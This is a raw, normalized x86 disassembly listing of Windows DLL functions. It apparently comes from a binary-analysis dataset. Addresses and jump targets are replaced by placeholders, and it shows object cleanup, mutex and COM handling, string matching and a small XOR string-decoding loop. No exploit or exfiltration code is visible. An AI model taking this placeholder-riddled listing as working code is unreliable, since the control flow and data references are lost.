push [ esi + 0x20 ]
call sub_1001b2d2
push [ esi + 0x24 ]
call sub_1001b2d2
push [ esi + 0x28 ]
call sub_1001b2d2
push [ esi + 0x2c ]
call sub_1001b2d2
push [ esi + 0x30 ]
call sub_1001b2d2
push [ esi + 0x34 ]
call sub_1001b2d2
push [ esi + 0x1c ]
call sub_1001b2d2
push [ esi + 0x38 ]
call sub_1001b2d2
push [ esi + 0x3c ]
call sub_1001b2d2
add esp 0x40
push [ esi + 0x40 ]
call sub_1001b2d2
push [ esi + 0x44 ]
call sub_1001b2d2
push [ esi + 0x48 ]
call sub_1001b2d2
push [ esi + 0x4c ]
call sub_1001b2d2
push [ esi + 0x50 ]
call sub_1001b2d2
push [ esi + 0x54 ]
call sub_1001b2d2
push [ esi + 0x58 ]
call sub_1001b2d2
push [ esi + 0x5c ]
call sub_1001b2d2
push [ esi + 0x60 ]
call sub_1001b2d2
push [ esi + 0x64 ]
call sub_1001b2d2
push [ esi + 0x68 ]
call sub_1001b2d2
push [ esi + 0x6c ]
call sub_1001b2d2
push [ esi + 0x70 ]
call sub_1001b2d2
push [ esi + 0x74 ]
call sub_1001b2d2
push [ esi + 0x78 ]
call sub_1001b2d2
push [ esi + 0x7c ]
call sub_1001b2d2
add esp 0x40
push [ esi + 0x80 ]
call sub_1001b2d2
push [ esi + 0x84 ]
call sub_1001b2d2
push [ esi + 0x88 ]
call sub_1001b2d2
push [ esi + 0x8c ]
call sub_1001b2d2
push [ esi + 0x90 ]
call sub_1001b2d2
push [ esi + 0x94 ]
call sub_1001b2d2
push [ esi + 0x98 ]
call sub_1001b2d2
push [ esi + 0x9c ]
call sub_1001b2d2
push [ esi + 0xa0 ]
call sub_1001b2d2
push [ esi + 0xa4 ]
call sub_1001b2d2
push [ esi + 0xa8 ]
call sub_1001b2d2
push [ esi + 0xbc ]
call sub_1001b2d2
push [ esi + 0xc0 ]
call sub_1001b2d2
push [ esi + 0xc4 ]
call sub_1001b2d2
push [ esi + 0xc8 ]
call sub_1001b2d2
push [ esi + 0xcc ]
call sub_1001b2d2
add esp 0x40
push [ esi + 0xd0 ]
call sub_1001b2d2
push [ esi + 0xb8 ]
call sub_1001b2d2
push [ esi + 0xd8 ]
call sub_1001b2d2
push [ esi + 0xdc ]
call sub_1001b2d2
push [ esi + 0xe0 ]
call sub_1001b2d2
push [ esi + 0xe4 ]
call sub_1001b2d2
push [ esi + 0xe8 ]
call sub_1001b2d2
push [ esi + 0xec ]
call sub_1001b2d2
push [ esi + 0xd4 ]
call sub_1001b2d2
push [ esi + 0xf0 ]
call sub_1001b2d2
push [ esi + 0xf4 ]
call sub_1001b2d2
push [ esi + 0xf8 ]
call sub_1001b2d2
push [ esi + 0xfc ]
call sub_1001b2d2
push [ esi + 0x100 ]
call sub_1001b2d2
push [ esi + 0x104 ]
call sub_1001b2d2
push [ esi + 0x108 ]
call sub_1001b2d2
add esp 0x40
push [ esi + 0x10c ]
call sub_1001b2d2
push [ esi + 0x110 ]
call sub_1001b2d2
push [ esi + 0x114 ]
call sub_1001b2d2
push [ esi + 0x118 ]
call sub_1001b2d2
push [ esi + 0x11c ]
call sub_1001b2d2
push [ esi + 0x120 ]
call sub_1001b2d2
push [ esi + 0x124 ]
call sub_1001b2d2
push [ esi + 0x128 ]
call sub_1001b2d2
push [ esi + 0x12c ]
call sub_1001b2d2
push [ esi + 0x130 ]
call sub_1001b2d2
push [ esi + 0x134 ]
call sub_1001b2d2
push [ esi + 0x138 ]
call sub_1001b2d2
push [ esi + 0x13c ]
call sub_1001b2d2
push [ esi + 0x140 ]
call sub_1001b2d2
push [ esi + 0x144 ]
call sub_1001b2d2
push [ esi + 0x148 ]
call sub_1001b2d2
add esp 0x40
push [ esi + 0x14c ]
call sub_1001b2d2
push [ esi + 0x150 ]
call sub_1001b2d2
push [ esi + 0x154 ]
call sub_1001b2d2
push [ esi + 0x158 ]
call sub_1001b2d2
push [ esi + 0x15c ]
call sub_1001b2d2
push [ esi + 0x160 ]
call sub_1001b2d2
add esp 0x18
sub_10046fb8
push 0x8
mov eax sub_100854b4
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004ab38
push eax
call sub_1005912f
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1004a1ad
push eax
call sub_1005912f
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1005a906
mov [ esi + 0x10 ] eax
call sub_10008d33
retn 0x4
sub_10047030
push ebp
mov ebp esp
push 0xffffffff
push sub_10085054
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
call sub_1003e875
mov [ esi + 0x8 ] eax
call sub_10004aa4
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_1000c927
mov eax [ edi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0xc ] bl
xor eax eax
mov [ esi + 0x3c ] 0x7
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] ax
push 0x10
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x48 ] bx
mov [ esi + 0x4a ] bl
call sub_1002e3ac
mov edi eax
add esp 0x4
mov [ ebp - 0x10 ] edi
cmp edi ebx
je r-xdata
inc eax
mov [ edi + 0x4 ] eax
xor edi edi
mov [ edi + 0x4 ] ebx
push r--data
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x4
mov [ edi ] r--data
call sub_10060250
call sub_100575c5
lea ecx [ ebp - 0x38 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_10025720
mov [ edi ] r--data
jmp r-xdata
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10030510
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10047126
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_10063a9a
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_10060405
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_10047210
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi ] eax
mov eax [ esi + 0x28 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] eax
call sub_1007e620
pop esi
pop ebp
retn
sub_10047236
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10082ec6
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10047270
push ebp
mov ebp esp
push ecx
push esi
add eax 0x18
mov esi ecx
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1005ca90
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_1004728e
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10047320
push ebp
mov ebp esp
sub esp 0x690
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x684 ] ecx
mov [ ebp - 0x68c ] edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x688 ]
mov eax 0x1
add ecx 0x80000001
mov [ ebp - 0x690 ] ecx
call sub_10071f30
lea edx [ ebp - 0x680 ]
xor eax eax
call sub_10071f30
lea edx [ ebp - 0x67c ]
mov eax 0x4
call sub_10071f30
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x67c ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0x5
call sub_10071f30
mov edx [ ebp - 0x68c ]
push 0x1
push edx
mov edx [ ebp - 0x690 ]
lea ecx [ ebp - 0x678 ]
lea eax [ ebp - 0x60 ]
call sub_1005f180
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10047689
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100476c0
cmp [ esi + 0x68 ] 0x8
jb r-xdata
push ebx
push edi
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x64 ] edi
mov [ esi + 0x54 ] cx
cmp [ esi + 0x4c ] 0x8
jb r-xdata
mov eax [ esi + 0x54 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x4c ] ebx
mov [ esi + 0x48 ] edi
mov [ esi + 0x38 ] ax
cmp [ esi + 0x30 ] 0x8
jb r-xdata
mov edx [ esi + 0x38 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x2c ] edi
mov [ esi + 0x1c ] dx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi + 0x1c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
xor ecx ecx
pop edi
mov [ esi ] cx
pop ebx
retn
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10047742
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100679ed
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_100477f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086ae8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xa
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
cmp [ ebx + 0x12c ] 0x0
lea eax [ ebx + 0x12c ]
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ ebx + 0x128 ] 0x0
lea edi [ ebx + 0x128 ]
je r-xdata
push eax
call sub_10021ad0
cmp [ ebx + 0x130 ] 0x0
lea esi [ ebx + 0x130 ]
je r-xdata
call sub_1003d460
cmp [ ebx + 0x138 ] 0x0
lea edi [ ebx + 0x138 ]
je r-xdata
call sub_1001b370
cmp [ ebx + 0x13c ] 0x0
lea edi [ ebx + 0x13c ]
je r-xdata
call sub_1006a3e0
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
call sub_1006a3e0
mov eax [ ebx + 0x120 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
push eax
call [ ReleaseMutex@IAT ]
mov eax [ ebx + 0x20 ]
push eax
call [ CloseHandle@IAT ]
mov eax [ ebx + 0x124 ]
test eax eax
je r-xdata
push eax
call esi
mov [ ebx + 0x120 ] 0x0
mov esi 0x8
cmp [ ebx + 0x118 ] esi
jb r-xdata
push eax
call esi
mov [ ebx + 0x124 ] 0x0
mov edi 0x7
xor edx edx
mov [ ebx + 0x118 ] edi
mov [ ebx + 0x114 ] 0x0
mov [ ebx + 0x104 ] dx
cmp [ ebx + 0xfc ] esi
jb r-xdata
mov ecx [ ebx + 0x104 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebx + 0xfc ] edi
mov [ ebx + 0xf8 ] 0x0
mov [ ebx + 0xe8 ] cx
cmp [ ebx + 0xe0 ] esi
jb r-xdata
mov eax [ ebx + 0xe8 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebx + 0xe0 ] edi
mov [ ebx + 0xdc ] 0x0
mov [ ebx + 0xcc ] ax
cmp [ ebx + 0xc4 ] esi
jb r-xdata
mov edx [ ebx + 0xcc ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebx + 0xc4 ] edi
mov [ ebx + 0xc0 ] 0x0
mov [ ebx + 0xb0 ] dx
cmp [ ebx + 0xa8 ] esi
jb r-xdata
mov ecx [ ebx + 0xb0 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebx + 0xa8 ] edi
mov [ ebx + 0xa4 ] 0x0
mov [ ebx + 0x94 ] cx
cmp [ ebx + 0x8c ] esi
jb r-xdata
mov eax [ ebx + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebx + 0x8c ] edi
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x78 ] ax
cmp [ ebx + 0x70 ] esi
jb r-xdata
mov edx [ ebx + 0x78 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebx + 0x70 ] edi
mov [ ebx + 0x6c ] 0x0
mov [ ebx + 0x5c ] dx
cmp [ ebx + 0x54 ] esi
jb r-xdata
mov ecx [ ebx + 0x5c ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebx + 0x54 ] edi
mov [ ebx + 0x50 ] 0x0
mov [ ebx + 0x40 ] cx
cmp [ ebx + 0x38 ] esi
jb r-xdata
mov eax [ ebx + 0x40 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebx + 0x38 ] edi
mov [ ebx + 0x34 ] 0x0
mov [ ebx + 0x24 ] ax
cmp [ ebx + 0x14 ] esi
jb r-xdata
mov edx [ ebx + 0x24 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x10 ] 0x0
mov [ ebx ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebx ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10047a9f
push 0x4c
mov eax sub_10085809
call sub_10047689
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_100262c3
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000985a
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10025720
push eax
lea ecx [ ebp - 0x58 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10047b56
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10047b90
push ebp
mov ebp esp
push 0xffffffff
push sub_10086a33
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x150 ] ebx
xor eax eax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff98
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x150 ]
push ecx
lea edx [ ebp - 0x1c ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0x18 ] ax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xf8
mov [ ebp - 0x148 ] ebx
call sub_1002f620
lea eax [ ebp - 0x148 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xaf
call sub_1002f620
mov [ ebp - 0x140 ] 0x1
jmp r-xdata
lea edx [ ebp - 0xfc ]
mov eax 0x9e
mov [ ebp - 0x14c ] ebx
call sub_1002f620
lea edx [ ebp - 0x14c ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x27
call sub_1002f620
mov [ ebp - 0x140 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x150 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x148 ]
push eax
call esi
mov ecx [ ebp - 0x14c ]
push ecx
call esi
mov edx [ ebp - 0x144 ]
push edx
call esi
mov eax [ ebp - 0x184 ]
push eax
call esi
mov ecx [ ebp - 0x188 ]
push ecx
call esi
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
lea edx [ ebp - 0x6c ]
mov eax 0xa9
mov [ ebp - 0x144 ] ebx
call sub_1002f620
lea ecx [ ebp - 0x144 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x3f
call sub_1002f620
lea edx [ ebp - 0x4c ]
mov eax 0x10c
mov [ ebp - 0x184 ] ebx
call sub_1002f620
lea eax [ ebp - 0x184 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x126
call sub_1002f620
mov [ ebp - 0x140 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x124
mov [ ebp - 0x188 ] ebx
call sub_1002f620
lea edx [ ebp - 0x188 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
call sub_1004e270
add esp 0x8
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xc0
call sub_1002f620
mov [ ebp - 0x140 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x184 ]
mov [ ebp - 0x154 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xb8
call sub_1002f620
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ ebp - 0x154 ] eax
xor eax eax
lea esi [ ebp - 0x180 ]
call sub_10014a90
xor eax eax
lea esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] ebx
call sub_10014a90
xor eax eax
lea esi [ ebp - 0x160 ]
call sub_10014a90
xor eax eax
lea esi [ ebp - 0x170 ]
call sub_10014a90
xor eax eax
lea esi [ ebp - 0x168 ]
call sub_10014a90
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x154 ]
cmp esi 0x6
ja r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x68
call sub_1002f620
mov [ ebp - 0x140 ] 0xb
jmp [ esi * 4 + jump_table_10048308 ]
lea edx [ ebp - 0x9c ]
mov eax 0xfb
call sub_1002f620
mov [ ebp - 0x140 ] 0x6
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xd9
call sub_1002f620
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x34 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x8
call sub_1002f620
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x5c ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax 0xa2
call sub_1002f620
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
